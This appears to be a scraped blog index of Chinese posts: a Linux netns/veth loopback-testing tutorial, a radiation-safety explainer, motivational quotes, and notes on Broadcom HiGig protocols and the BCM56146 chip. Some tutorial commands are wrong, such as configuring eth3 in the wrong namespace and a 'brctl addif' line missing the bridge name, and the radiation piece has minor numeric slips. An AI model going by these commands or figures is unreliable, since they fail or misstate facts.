可是，仅凭4个光口怎么测试？起码你要有个”对端”啊！任何人应该都不想扛着三台机器在客户们之间跑来跑去测试其转发性能，当然你也不能指望客户那里就一定有你需要的”对端”设备，比如我们公司就没有这种和万兆光口对接的设备，不过赶巧的是，那天还真有一台设备带有万兆光口，但是只是碰巧了。最佳的测试方式当然是不依赖任何外部设备了，显而易见的方法就是做自环。 RJ45口的双绞线可以做物理层自环，1/3，2/6短接即可，这样一台机器的一块网卡自己就可以既发又收了，但是你能对比头发略粗的光纤做什么呢？真实的做法当然是用软件解决了，在Linux上可以使用netns来解决，即net namespace。 netns是一个很好玩的东西，它可以让你在一台机器上模拟多个网络设备，这样做的意义是非同一般的： 1.使用netns可以充分利用闲置的处理器资源，特别是你的多块网卡性能压不满CPU的时候； 2.使用netns可以将不同类型的网络应用隔离，针对每一类实施不同的策略； 3.使用netns有点玩虚拟化的意思，不过比虚拟机更灵活。 一个net namespace有自己独立的路由表，iptables策略，设备管理机构，和其它的netns完全隔离，比如你将eth0加入了netns1，那么netns2中的应用程序就看不到eth0，网卡设备管理只是netns中的一个元素，还有很多，比如你在netns1中配置的iptables策略对netns2中的数据包没有任何影响。总之，如果你懂Linux内核源码，那么只要附着有net结构体字段的那些结构，比如skb，net_device，都和netns有关。 那么我应该怎么做自环呢？我的设备有4个网卡，我希望1和4之间通信，通过2和3转发，它的逻辑拓扑如下： PC1/eth0—-PC2/eth1(forward)PC2/eth2—-PC3/eth3 很简单，将eth0和eth3设置在两个不同的netns，然后用线缆连接eth0和eth1，同样连接eth2和eth3，最后将eth0和eth1的IP地址设置在一个网段，将eth2和eth3的IP地址设置在另一个不同的网段即可。光说不练假把式，具体应该怎么做呢？同样很简单： 1.添加两个netns ip netns add t1 ip netns add t2 2.将eth0加入t1，并且设置IP地址 ip link set eth0 netns t1 此时再ifconfig就看不到eth0了，你甚至执行ls /sys/class/net也看不到eth0了，只有执行ip netns exec t1 ls /sys/class/net才能看到。 ip netns exec t1 ifconfig eth0 192.168.1.200/24 3.将eth3加入t2，并且设置IP地址 ip link set eth3 netns t2 此时ifconfig就看不到eth3了，你甚至执行ls /sys/class/net也看不到eth3了，只有执行ip netns exec t2 ls /sys/class/net才能看到。 ip netns exec t1 ifconfig eth3 172.16.1.200/24 4.设置eth1和eth2的地址 ifconfig eth1 192.168.1.1/24 ifconfig eth2 172.16.1.1/24 5.设置两个netns的默认路由 ip netns exec t1 route add default gw 192.168.1.1 ip netns exec t2 route add default gw 172.16.1.1 6.测试 在netns t1中ping netns t2中的eth3地址 ip netns exec t1 ping 172.16.1.200 上述配置之后，从eth0发出的包会通过网线到达eth1(而不是走local路由表的loopback)，然后经过eth1的forward从eth2发出。经由网线到达目的地eth3杯接收。整个过程中就一台机器，展示出的效果好像三台机器的样子。有了这个机制，是不是再也不用为搭建测试环境而发愁了呢？ 除了自环测试之外，netns还可以用于设置策略路由，这种策略路由不需要ip rule。试想一种场景，你同时运行了P1和P2两个程序，本机所在的局域网有两个出口到达外网，你希望P1通过gw1和外界通信，P2通过gw2和外界通信，约束条件是你的机器只有一张网卡eth0，怎么办呢？通过iptables为P1和P2的数据包打上不同的mark，然后通过ip rule设置策略路由无疑可以解决，另外直接在P1和P2应用程序中用setsockopt也是可以设置ipmark的，这就不需要iptables了。然而这一切都过时了，2014年我需要一种不同的方式。 我不知道怎么表达我思考的过程，但是给出一个操作序列是简单的事情，因为照着这么做确实可以满足需求，然后看到这篇文章的人照着操作步骤倒推回去，就可以得到一个思考过程。首先你要明白的是Linux内核支持一种虚拟网卡类型，即veth，一般而言veth是成对的，从一个veth发出的数据包可以直接到达它的peer veth，感兴趣的可以看Linux内核的drivers/net/veth.c，和drivers/net/tun.c没什么不同，更简单些罢了。第一步要做的就是建立一对veth： ip link add veth1 type veth peer name veth2 此时系统中除了eth0之外又多了两块网卡，所有的网卡为lo，eth0，veth1，veth2。中间隐含着一个事实，即veth1和veth2之间有一条虚拟的链路将两块网卡连接起来，就好像一条双绞线连接的两块物理网卡一样。我现在希望P1的数据包通过veth1发出，然后自然而然地就能发到veth2，但是随后怎么通过eth0发到物理线路呢？太简单，太简单，使用bridge吧： brctl addbr br0 brctl addif br0 eth0 veth2 同时，veth1和br0所在的局域网设置在一个IP网段中，这下子就全通了，该二层网络的逻辑拓扑为： veth1—-veth2(bridge)eth0—-gw(1,2) 怎么设置netns我本来不想说了，但是由于小小暂时不跟我玩了，我还是写完吧。首先将veth1设置到netns1(具体怎么创建netns，不再赘述)并设置路由： ip link set veth1 netns netns1 ip netns exec netns1 route add default gw $gw1 route add default gw $gw2 这就完了？是的，完事了。事实上，保留br0的默认netns即可，没有必要创建netns2了。接下来需要做的就是启动P1和P2了： ip netns exec netns1 P1 P2 好了，一切结束。 我始终都觉得，在Linux上一般都是不用修改源码就能解决问题，可是我还是喜欢修改代码，原因何在？很简单，源码很容易获得，并且源码很容易修改，我走火入魔般地写了大量的Netfilter扩展以及做了大量的nf_conntrack修改，甚至还添加了一些该死的socket filter…虽然这些行为都是自娱自乐型的，并没有被应用在工作中，但是这些行为说明我不是网络管理员，而是一名程序员，哈哈，自封的资深软件工程师(我还是觉得这些成果能被应用)。然而，做一名技术精湛的网络管理人员的难度却远远超过做程序员的难度。这不，又一次遇到了OpenVPN的多实例问题，我觉得，单纯的程序员搞不定它，单纯的网管也不行。 TAP模式的多实例已经被我用Linux Bridge完美蹂躏了，但是TUN模式的多实例问题仍然没有完美的方案，虽然修改tun驱动，使用broadcast mode bonding+tun filter可以解决，但是我还是觉得那是一种走火入魔的方式，因此就算在公司我也没能将整个调试测试进行下去，结果落了个不了了之，事实上，是我太不喜欢那种方式。tun的IP filter是我改出来的方案，并非标准的，能不能使用标准的方式进行寻址呢？使用netns，答案就是肯定的。 假设在GW上启动了2个OpenVPN实例ovpn1和ovpn2，虚拟网卡分别为tun1和tun2，在client-connect脚本中得知ovpn2负责N1，ovpn2负责N2。现在问题的关键是，GW后方出发的数据包如何知道是将数据包发送到tun1还是tun2，这个判断能不能自动进行？如果使用netns，那就是可以的，我可以将2个tun分别设置在不同的netns，然后每一个netns对应一个同处一个netns的veth虚拟网卡，这些veth的peer们处在另外一个netns中，这样就可以实现IP层TUN模式虚拟网卡到以太网的TAP模式虚拟网卡的适配。最后将这些peer们Bridge成一个br0，那么TUN模式的OpenVPN就能和TAP模式的OpenVPN采用同一种方式处理了。 不管怎样，当你玩弄netns的时候，你要知道你并不是在玩弄冷酷无情的虚拟化操作系统，也不是真的模拟了两台物理上相互隔离的机器，因为虽然两个程序的网络是隔离的，但是文件系统却是共享的。你要时刻准备着，使用网络隔离和使用内存，文件系统共享相结合。将一台机器既可以作为多台机器使用，又可以作为一台机器共享资源！ 不管怎样，当你玩弄netns的时候，你要知道你并不是在玩弄冷酷无情的虚拟化操作系统，也不是真的模拟了两台物理上相互隔离的机器，因为虽然两个程序的网络是隔离的，但是文件系统却是共享的。你要时刻准备着，使用网络隔离和使用内存，文件系统共享相结合。将一台机器既可以作为多台机器使用，又可以作为一台机器共享资源！ 理解了上述的例子和最后的总结，那么我来发问，单网卡或者没有网卡怎么玩自环？这个需求可能就是为了测试一下协议栈而已。略去思考的过程，很简单，多加一个层次。比如你有一台机器一块网卡也没有，那么你只需要下面的命令就可以在你的机器上实现IP转发或者bridge转发了： ip link add v1 type veth peer name vp1 ip link add v2 type veth peer name vp2 brctl addbr br0 brctl addif vp1 vp2 ifconfig vp1 up ifconfig vp2 up sysctl -w net.ipv4.ip_forward=1 ip netns add t1 ip netns add t2 ip link set v1 netns t1 ip link set v2 netns t2 ip netns exec t1 ifconfig v1 1.1.1.1/24 ip netns exec t2 ifconfig v2 1.1.1.2/24 ip netns exec t1 ping 1.1.1.2 …","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"手机、电脑辐射比太阳光安全？","slug":"EMBEDDED/手机、电脑辐射比太阳光安全","date":"2016-08-09T23:42:00.000Z","updated":"2017-07-10T08:46:47.757Z","comments":true,"path":"EMBEDDED/手机、电脑辐射比太阳光安全.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/手机、电脑辐射比太阳光安全.html","excerpt":"一提到辐射，大家的第一反应就是怕！手机有辐射、电脑有辐射、安检门有辐射、高压电也有辐射！电脑辐射会致癌、手机放床头会长脑瘤、辐射会引发痴呆……这些有关辐射危害的流言不胫而走，让人闻之色变。 其实，自然界中的所有物质，只要其温度高于绝对零度0K（即-273","text":"一提到辐射，大家的第一反应就是怕！手机有辐射、电脑有辐射、安检门有辐射、高压电也有辐射！电脑辐射会致癌、手机放床头会长脑瘤、辐射会引发痴呆……这些有关辐射危害的流言不胫而走，让人闻之色变。 其实，自然界中的所有物质，只要其温度高于绝对零度0K（即-273.14℃），它就会不断辐射电磁波。我们日常所处的温度大约是300K（即27℃），这远高于绝对零度，也就是说，我们的确生活在一个充满辐射的世界里。 但是，辐射对人体的伤害真如传说的那么严重吗？哪些辐射是需要防备的，哪些担心其实是多余的呢？ 非电离辐射比晒太阳都安全 中山大学物理科学与工程技术学院教授姚道新介绍，辐射在物理学上严格来说是指零质量粒子以光速传递能量的形式，其中电磁波最为常见。“电磁波频率越高，危害越大；能量越高，危害越大”。 姚道新说，除了电磁波之外，放射性元素发出的高速粒子束流，通常也称为辐射，例如：组成α射线的粒子是氦原子核，组成β射线的粒子是高速的电子。 中山大学物理科学与工程技术学院副教授张宏浩补充说，根据量子力学，电磁波是由一份一份的光子组成的，单个光子的能量与电磁波的频率成正比，频率越高，单个光子的能量就越大，对生物分子的破坏性就越大。 辐射可以分为电离辐射与非电离辐射，它们是按照单个组分粒子的能量高低来划分的。 电离辐射具有足够高的单粒子能量可以将原子或分子电离化，主要包括α、β、及X射线。这类辐射在足够的强度下可以对生物体造成严重的伤害。 生物体的各种生命活动都依赖于原子或分子层面的稳定，而电离辐射所具有的高能量的单粒子可以破坏生物分子的化学键，从而使分子的性质改变，严重时可以造成基因变异或者致癌。核辐射就属于电离辐射，所以我们需要对核设施进行严格的限制和管理。 类似红外线、微波、无线电波以及无线长波等低频率射线都属于非电离辐射。区别于电离辐射，组成它们的粒子（即组分粒子）能量小，不足以破坏分子的化学键，不会引起原子或分子的电离。辐射组分粒子的能量只取决于电磁波的频率，如果频率不足，射线强度再高也一样无法引起电离。 从电磁波的波长与频率对照表中得知，人类肉眼可以感知的可见光发散的射线频率约为1015赫兹，而手机、电视雷达发散的射线频率约为109赫兹。 姚道新笑称：“如果说手机、电脑的辐射危险，那平时处在太阳光下就更加危险了。” 生活中大多是非电离辐射 姚道新指出，生活中的电离辐射主要存在于安检、X光、CT检测，以及放射治疗等，主要应用于医学方面。而我们日常生活中会接触到的辐射大部分属于安全的非电离辐射。 非电离辐射不能引起原子或分子电离，但是也会对生物体造成影响，主要体现在热效应与感应电流上。 人们晒太阳时感觉身体发热，甚至皮肤发烫，电器的辐射也是同理。相对来说，电器辐射强度极低，晒太阳都没事，电器的这种热效应就更没必要担心了。 而感应电流则产生在无线电波及长波无线电等低频率辐射中。 人体内的感应电流只有达到0.7mA，才会被人体感知到。一个人即使站在500KV的高压线下，其体内的感应电流也只有0.005mA左右，至于家用电器，它们的工作电压大多为220V，其引起的感应电流完全可以忽略。 从科学的角度分析，很多防辐射“谣言”，如洗脸防辐射、仙人掌防辐射、防辐射孕妇装等都是没有科学依据的。 张宏浩提醒，有安全意识固然是好事，但是不经判断就轻信传言，也许只能带来无限的恐慌和烦恼。 他说，对于普通人的日常生活来说，在使用手机、电脑时，我们担忧的焦点不应该在辐射的危害上，更应该担心的是它们给我们的生活习惯所带来的改变，比如长时间坐着对脊椎的影响，长时间看电子屏幕对眼睛的伤害等。 虽然从科学的角度来看，生活中的非电离辐射对人体并没有什么伤害，但是两位教授认为，辐射对人体健康的影响也存在个体因素。 “如果长时间打电话，对着大脑同一个位置发热，集合起来的辐射能量变大，累计伤害，最后也可能诱发病症。”姚道新介绍，辐射的影响与辐射的剂量相关。如果长时间暴露在电磁辐射中，即使是非电离辐射，也会对人体健康有影响。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"記住一句話：「越努力，越幸運」！如果你累了，請看這 9張圖！特別是最後一張...","slug":"EMBEDDED/記住一句話：「越努力，越幸運」！如果你累了，請看這 9張圖！特別是最後一張...","date":"2016-08-08T03:25:28.000Z","updated":"2017-07-10T08:47:32.712Z","comments":true,"path":"EMBEDDED/記住一句話：「越努力，越幸運」！如果你累了，請看這 9張圖！特別是最後一張....html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/記住一句話：「越努力，越幸運」！如果你累了，請看這 9張圖！特別是最後一張....html","excerpt":"如果你累了，請看這 9張圖！ 特別是最後一張… 繼續看下去… 1. 人的一切痛苦，本質上都是，對自己無能的憤怒！ 2. 只有經歷最痛苦的堅持，才配得上擁有最長久的幸福","text":"如果你累了，請看這 9張圖！ 特別是最後一張… 繼續看下去… 人的一切痛苦，本質上都是，對自己無能的憤怒！ &lt;/span&gt; 只有經歷最痛苦的堅持，才配得上擁有最長久的幸福！ &lt;/span&gt; 記住一句話：「越努力，越幸運」！ &lt;/span&gt; 真正能讓你倒下的，不是對手，而是你絕望的內心！ &lt;/span&gt; 你處理情緒的速度，就是你邁向成功的速度！ &lt;/span&gt; 一個人越懶，明天做的事就越多！ &lt;/span&gt; 活著就意味著，必須要做點什麼，請好好努力！ &lt;/span&gt; 任何值得去的地方，都沒有捷徑！ &lt;/span&gt; 你的負擔，將變成禮物，你受的苦，將照亮你的路！ &lt;/span&gt;","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"HiGig/HiGig+/HiGig2","slug":"EMBEDDED/higighigighigig2","date":"2016-08-04T03:42:58.000Z","updated":"2017-07-10T08:50:00.558Z","comments":true,"path":"EMBEDDED/higighigighigig2.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/higighigighigig2.html","excerpt":"HiGig(通常称为HiGigTM)是Broadcom公司的私有串行总线互联方案，于2001年推出，主要用于Broadcom公司StrataXGS系列芯片(如BCM5670/BCM5690等)之间的互联(也可以跟支持HiGig协议的NPU或ASIC连接)，","text":"HiGig(通常称为HiGigTM)是Broadcom公司的私有串行总线互联方案，于2001年推出，主要用于Broadcom公司StrataXGS系列芯片(如BCM5670/BCM5690等)之间的互联(也可以跟支持HiGig协议的NPU或ASIC连接)，既可用于板内连接，也可通过背板走线形式实现跨板连接。 HiGig总线是在以太网协议的基础上发展而来的，它在以太网二层报文中插入HiGig头，形成HiGig报文，通过HiGig头部携带的控制信息，来实现芯片端口的镜像、聚合、QOS等功能。 如上图所示，将以太网二层报文的8Byte前导码和4个字节帧间隙(共12个字节帧间隙)替换成12个字节的HiGig报文头，这样，HiGig报文只有8个字节帧间隙，没有前导码。 HiGig接口支持的最大速率为10Gbps(共4对SerDes通道，每通道最大支持3.125Gbps，因为经过了8B/10B变换，所以有效带宽为2.5Gbps)，物理层电气特性如XAUI端口相同(详见IEEE802.3ae clause 47)。 Broadcom公司在其StrataXGS II系列产品上(如BCM5675/BCM5695等)推出了HiGig+总线，HiGig+只是在HiGig的基础了做了细微改进，将端口支持的最大速率从10Gbps提高到12Gbps(每个通道的最大速率从3.125Gbps提高到3.75Gbps),至于协议部分，没有做任何更改，与HiGig完全一样，所以对HiGig接口完全兼容。 隨着通信技术的发展，HiGig/HiGig+总线也暴露出了其自身的局限线，在对更高端的网络市场应用中显得力不从心，主要表现在以下几个方面： 1).地址空间和服务种类有限，满足不了更高级系统应用； 2).头部结构不够灵活，满足不了未来技术发展； 3).对流控和负载均衡技术支持不足。 在此背景下，Broadcom公司于2005年在其StrataXGS III系列产品(如BCM56580/ BCM56700/BCM56800等)上推出了HiGig2总线，HiGig2总线在HiGig+总线的基础上，对端口速率和传输协议都进行了更改。 HiGig/HiGig+报文头为12个字节，而HiGig2报文头部增加到16个字节，使得HiGig2报文可以携带更多的信息来决定报文的处理方式，如镜像、重定向、流控和负载均衡等。如下图所示： 说完HiGig/HiGig+/HiGig2后，不得不顺便说下另外一种非主流的HiGig类协议HiGig-Lite。由于HiGig-Lite不能与HiGig/HiGig+/HiGig2兼容，所以其只在很小范围内有使用(只局限在BCM5601x/BCM5620x/BCM5622x/BCM5371x几个系列芯片上)。HiGig-Lite端口只支持2.5Gbps速率，报文帧结构同XGMII类似。 HiGig-Lite协议不像HiGig/HiGig+/HiGig2那样将报文的前导码和部分帧间隙替换成HiGig/HiGig+/HiGig2头部，以求变换后的报文传输效率不变，而是保持原以太报文的前导码和帧间隙不变，只是在以太报文的前导码和目的MAC地址之间插入了一个16字节的HiGig-Lite报文头，如下图所示： HIGIG Higig（XAUI）接口有4个通道，higig header中byte0使用lane0传输，byte1使用lane1，byte2使用lane2，byte3使用lane3，byte4使用lane0，依次类推。 Higig header主要包括：START_OF_FRAME (SOF)、DST_MODID、SRC_MODID、HDR_EXT_LENGTH、VID_HIGH、VID_LOW、VID_LOW、 SRC_MODID、SRC_PORT_TGID、DST_PORT、DST_MODID 、HDR_TYPE。其中HDR_TYPE决定HDR_TYPE之后4byte的格式。 HDR_TYPE：00 = Overlay 1 (default)，提供mirroring/trunking信息 01 = Overlay 2 (classification tag)，提供分类、过滤处理。 HIGIG2 HIGIG2 PACKET HEADER Higig2 Packet Header： 中包括， FRC和PPD。 1）K.SOP (0xFB): control character will always be aligned with Lane 0.即分隔符 2）K.EOP (0xFD): control character will be aligned depending on the length of HG_Payload 3）HG_Payload: will carry the Ethernet frame starting from the MACDA field 4）Fabric Routing Control (FRC)，占用7个字节。FRC中比较有用的是： MCST（多播还是单播）、 TC [3:0]（用于qos）、 DST_MODID [7:0] /MGID [15:8] （目的mode id）、 DST_PID [7:0] /MGID [7:0]（目的端口id）、 SRC_MODID [7:0]（源mode id）、 SRC_PID [7:0]（源端口id）、 PPD_TYPE（Packet Processing Descriptor Type） 5）Packet Processing Descriptor (PPD)，占用8个字节。主要是根据FRC中的PPD_TYPE决定PPD的结构 000: PPD Overlay1 001: PPD Overlay2 010~111: Reserved。 6) HG_CRC32: will cover the bytes starting from the K.SOP to the last byte of the HG_Payload for packet error protection. HIGIG2 MESSAGES Higig2 messages占用16byte。 K.SOM:分隔符 HG_CRC8：crc校验，从K.SOM到最后一个HG_Message。 Higig2 messages可以出现在higig2数据包中，也可以独立成包。 Higig2 messages包括MSG_TYPE（message类型）、FWD_TYPE MSG_TYPE 000000: Flow Control FWD_TYPE： 00: Link Level Higig2能够兼容HiGig+，而HiGig+不能兼容higig2. 在支持higig2和higig+的结构，结构图如下 Combo MAC能够区分higig2 header和higig+ header. Translation shim负责转换为higig+ header。 Common HiGig+ Fabric Processing Core负责处理路由方案。 HIGIG-LITE HIGIG-LITE header 位于以太报文的前导码和目的MAC地址之间，占用16byte，HIGIG-LITE由两部组成：8byte的FRC和8byte的PPD。 HIGIG-LITE堆叠协议与基于HIGIG、HIGIG2的StrataXGS设备是不能兼容的，只有基于HIGIG-LITE的设备之间可以堆叠。 功能描述 每个交换设备都有唯一的一个mode id，用于转发数据包。Frabric设备没有mode id，因为他们只适用于扩展系统，而不是边沿设备，它只是需要通过mode id定位到相应的端口。 Mode id的数量是有限的，原来一个端口对应一个mode id，后来由于支持了重新映射功能，可以有多个端口对应一个mode id，通过端口数来区别。 当一个数据包需要通过higig口传递时，入口交换设备需要header域添加合适的信息，fabric设备和其他交换设备需要分析header中的opcode，来获知数据包的类型（CPU、broadcast、multicast、known unicast）。 Opcode=0：cpu控制报文。在大多数情况是发送给cpu的报文。 Opcode=1：known unicast packet。入口交换查找2层/3层 table，找到一个匹配的。在mode header中，dst_modid 、dst_port 制定了最后的出口。中间的Fabric、交换设备根据MH中内容来转化数据包，在目的mode，通过dst_port来发送到对应的端口上。不需要转发表。 The ingress switch device will set opcode==1 for the following conditions: 1. Matching L2 entry 2. Matching L3 entry 3. FP match action==redirect Opcode=2：用于广播，或者是在table中没有找到匹配的单播。Fabric、switch设备会将报文发到MH中制定的vlan中的其他成员。 Opcode=3：KNOWN L2 MULTICAST PACKETS。入口交换查找L2/L2MC table，找到一个匹配的。在mode header中，dst_modid 、dst_port 指定了多播组id，中间的Fabric、交换设备根据MH中多播组id在L2/L2MC table查找，确定最后目的端口号。 Opcode=4：KNOWN L3 MULTICAST PACKETS。入口交换查找L3/L3MC table，找到一个匹配的entry，在mode header中，dst_modid 、dst_port指定了IPMC group ID, 中间的Fabric、交换设备将定位L3/L3MC table，使用MH中IPMC group ID，确定最后目的端口号。 Opcode=5、6、7：无效的操作。 端口镜像 在StrataXGS I/II，端口镜像到镜像端口端、报文发送到目的端口，需要module header中的mirror, mirror_done, mirror_only确定。 STRATAXGS I MIRRORING (BCM5670) (mirror, mirror_done, mirror_only)==(100)表示报文需要映像和交换。如果交换端口和镜像端口为同一个端口，那么只需要发送一个报文；如果不是同一个端口，需分别发送一个报文。无论是发送到交换端口还是镜像端口，报文module header域都不需要改变。 上图中MTP为镜像端口，B为交换端口 STRATAXGS II INGRESS MIRRORING (BCM5675) 上图中MTP为镜像端口，B为交换端口。 如果映像端口与交换端口不是同一个端口，会发送两个数据包，两个端口各一个。 (mirror, mirror_done, mirror_only)==(110)表示报文只映射不交换 (mirror, mirror_done, mirror_only)==(101)表示报文值交换不映射 STRATAXGS III INGRESS MIRRORING (BCM56500) 交换设备在经过higig会建立会有3份数据包拷贝： Switch copy、Ingress mirror copy 、Egress mirror copy 发送switch copy时，header会是MH.opcode==1 (known unicast), dst_modid, dst_port, mirror=0。 发送mirror copy时，header会是MH.opcode==1 (known unicast), dst_modid, dst_port, mirror=1。 对于ingress mirror copy，报文是没有经过修改的原始报文。 2.5G HIGIG 模式 在2.5G higig模式下，只是用一个通道XAUI lane (0)，XAUI lane (1-3)没有使用。只有基于XAUI 的端口才支持2.5G higig模式 56146功能 56146简介 该款芯片有24个FE口，4个1G/2.5G口。 56146支持的交换功能：L2交换、l2多播、vlan、Double VLAN Tagging、VLAN Range-Based Double Tagging、端口过滤、速率风暴控制、生成树、链路汇聚、镜像、L3路由、IP多播、CFP、QOS、端口安全、DoS、Cpu协议包处理、堆叠、MIB等。 56146支持Ethernet/IEEE 802.3包长为64-1522B，jumbo数据最大为12KB，支持16K的mac地址学习，支持1K的2层多播组，支持4k vlan，链路汇聚支持128个trunk，每个端口有8个CoS队列，堆叠支持128个module， 56146的交换能力达到12.4Gps，24个FE口支持10M/100M，使用的接口是S3MII，BCM56146有2个HyperCores，每个HyperCores可以设置2个1G/2.5G port，所以有4个1G/2.5G端口，当设置为1G时，支持10/100/1000M full/half-duplex, 1000Base-X (fiber), 100Base-FX mode (fiber)模式，使用SGMII接口，当设置为2.5G时，支持HiGig-Lite或overclocked-Ethernet模式。 Cpu对56146的访问主要使用pcie接口。Port-based rate control with 8 Kbps granularity。 主要包括的表是： 1）端口表（Port Table）：每个端口在表中有一条目，记录l2学习、没用的端口、vlan处理、任务优先级等。 2）基于mac的vlan表（MAC-Based VLAN Table）：能容纳24K的mac地址，是基于源mac的vlan表，这个表与vlan转换表协同工作。 3）Vlan转换表（VLAN Translation table）：入口、出口分别2K，用于客户vlan与服务提供商vlan之间转换，与基于mac的vlan表协同工作。 4）基于协议的vlan表（Protocol-Based VLAN Table ）：每个端口16个。 5）Vlan表（VLAN Table）：容纳4K个vlan，显示每个vlan的端口和生成树组。 6）生成树组表（Spanning Tree Group Table）：容纳256个生成树组，显示每个生成树组中每个端口的生成树状态。 7）mac地址表（MAC Address Table）：容纳16K个mac地址，包括学习到的mac和编写的mac，表示目的端口和其mac地址属性（源、目的丢弃、阻塞、优先级、镜像等） 8）保留mac地址表（Reserved MAC Address Table）：包括64个条目，存储保留的mac地址。 9）mac阻塞表（MAC Block Table）：容纳32组。出口处的阻塞、洪泛的源mac地址组。 10）2层多播表（Layer 2 Multicast Table）：容纳1K组。存储2层多播组。 11）链路汇聚组表（Link Aggregation Group Table）：容纳128组。表示链路汇聚组端口成员与hash选择条件的关系。 12）基于IP子网的vlan表（IP Subnet-Based VLAN Table）：容纳256个子网。 13）DSCP表（DSCP Table）：容纳1920个条目。重新映射入口、出口DSCP到新的DSCP和优先级 14）3层主机路由表（Layer 3 Host Route Table）：容纳512个IPV4主机，或256个IPV6主机。 15）3层最长前向匹配路由表（Layer 3 LPM Route Table）：64 IPv4 路由或32个IPv6 路由 16）3层IP组播表（Layer 3 IP Multicast Table）：容纳64组。 56140系列交换芯片功能 56140系列芯片主要包括包括： 他们符合StrataXGS® IV switching family Pipeline Blocks 1）Intelligent Parser：包括full parser 和HiGig+/HiGig2 parser。Full parser主要是分析入口处的数据包中前128字节的。Higig parser主要是分析HiGig+/HiGig2 header信息。 2）Security Engine：主要提供Early discard detection、Control Denial-of-Service, DoS, attack detection、Flow-based mirroring、Flow-rate metering。 3）L2 Switching：执行vlan、权限任务，寻找转发包的目的mac地址、源mac地址学习，包括VLAN type select、VLAN look-up、L2 unicast look-up、L2 multicast look-up。 4）L3 Routing：支持3层的ip协议。执行单播、多播数据包的源ip地址、目的ip地址查找。包括：L3 unicast look-up、L3 multicast look-up、Longest prefix match、Look-up switch logic、 Strict and loose uRPF checks。 5）ContentAware Processing：支持快速过滤处理、ACL、differentiated services、QoS。要分析这些内容：MACDA, MACSA, DIP, SIP, TCP, several others等等。 6）Buffer Management：提供cos、带宽保障、带宽限制、metering mechanisms。 7）Modification：数据包的修改可能是由于VLAN Translation、L3 routed packet modification等原因。 Memory Management Unit 内存系统主要有CBP和transaction queue (XQ)组成，主要是管理cell buffer，设备支持1.5M cell buffer poll（CBP）。对于buffer的管理方式主要是：Ingress backpressure (IBP)、Head-of-line (HOL) prevention、 Ingress rate shaping, PAUSE metering a) IBP主要用于入端口，缓解端口拥塞;尽可能减少数据包的丢失。 在Ingress Ports上有效管理buffer资源; 基于每端口设置IBP产生门限值与IBP消除门限；当到达的数据包数量满足达到门限，发送Pause帧; 当达到的数据包数量低于IBP的消除门限，停发Pause帧; b) HOL主要用于出端口和cos。 当多个端口或多个流向一个端口发送数据包时有可能会产生阻塞，会引起输入端口到其它端口数据包的丢失,此种情况即为HOL(Head-of-Line Blocking，线路头阻塞)。 通过设置HOL门限值，当进入的数据包达到该门限,不再允许新的数据包进入Egress队列,在MMU丢弃这些数据包。HOL预防机制通过丢弃数据包达到目的; 与PAUSE Metering, Ingress Backpressure不同。 提供两种HOL预防机制：Cell-base。设置每个端口所用memory大小; Packet-based。设置每个端口输出队列的包的最大个数. c) PAUSE Metering：主要是为入口提供实现入口速率整形。他会追踪每个入端口的带宽，当超过限制时，会发送PAUSE message。 每个端口有独立的漏桶，用于限制带宽与流量整形。 如下所示,每T_REFRESH(7.8125 ms)周期从BUCKET中取出REFRESHCOUNT 个token (每token=0.5bit); 初始化是漏桶bit值为0(令牌为full)，当进入一个packets 时，相当于往BUCKET注入相应的token,每周期取出REFRESHCOUNT ；当进入的包大于PAUSE_THD 时，PAUSE帧产生;这就是PAUSE Metering功能，用于IBP机制; Search Engines 支持Hash search engine、CAM search engine。 Hash search engine (HSE)主要用在L2 MAC table (for look-up and learning), L3 host table (for IPv4 and IPv6 look-ups), MAC VLAN, IPMC searches (s,g) and (*,g), Ingress VLAN translation, and egress VLAN translation中。 CAM search engine (CSE)主要是在使用ContentAware engine时，被Default routing/policy routing/ingress ACL或HiGig ACL触发。 ContentAware Processor (CAP) 所谓ContentAware就是对packet的内容进行智能匹配的技术。主要是为ACL, DSCP, QoS等提供支持。 这5个部分分别是智能协议识别选择器、CAM查找引擎、策略引擎、meter和统计引擎、动作裁决引擎。在ingress端口，智能协议识别选择器对进来的包的前128bit按照协议字段进行选择和标记，CAM查找引擎按照用户给的key匹配协议选择器的内容，如果找到了，就执行策略引擎的动作，并可以实验meter和统计引擎进行限速、标记颜色和统计。 MEF Policing Meter用于监控传输带宽。SrTCM、TrTCM、modified TrTCM是meter的三种方案。有待定信息速率(CIR)和额外信息速率（EIR），他们有一定扩展范围，分别是CBS和EBS - 当进入包数量在CBS之内时，报文标识为Green，可被转发的报文; - 当进入包数量超出CBS但在EBS之内,超出CBS部分的包标识为YELLOW, YELLOW 包不保证可发,可应用丢弃/转发操作; - 当进入的包数量超出EBS,超出EBS的包标识为RED,不会得到令牌转发; Committed Information Rate (CIR) Committed Burst Size (CBS) Excess Information Rate (EIR) Excess Burst Size (EBS) CPU Management Interface Controller (CMIC) CPU通过PCI接口与芯片的CMIC模块连接，并与芯片交互数据；通过PCIe接口，提供两种交互数据的机制： - DMA 通道;用于交互大量数据块，比如收发数据包,CPU获取芯片的内存表数据; - MESSAGING MECHANISM(消息机制)；用于交互小数据块，比如CPU读写芯片寄存器，读写内存表; Packet Flow 1）2层入口数据包流 数据包到达入口处时，会被分析，从数据包取出相关的内容，进行CAP处理，然后，判断数据包是否已经加了tag还是没有加tag。对于没有加tag的数据包，需要从VLAN_XLATE table、 Subnet-based table、 Protocol-based table、 Port-based table (default)中指定vlan id。对于已经加tag的，可以从数据包中获得vlan id。通过vlan查找表，可以知道数据包是否属于这个vlan，如果属于这个vlan，将进行STP、vlan端口bitmap、PFM (port filtering mode)处理，如果这个数据包的vlan是无效的，将丢弃该数据包。 随后，开始了学习阶段。查看该数据的源mac地址和vlan id是否已经在L2 table中，如果有，说明已经学习过了，如果没有，学习的方法取决于CPU 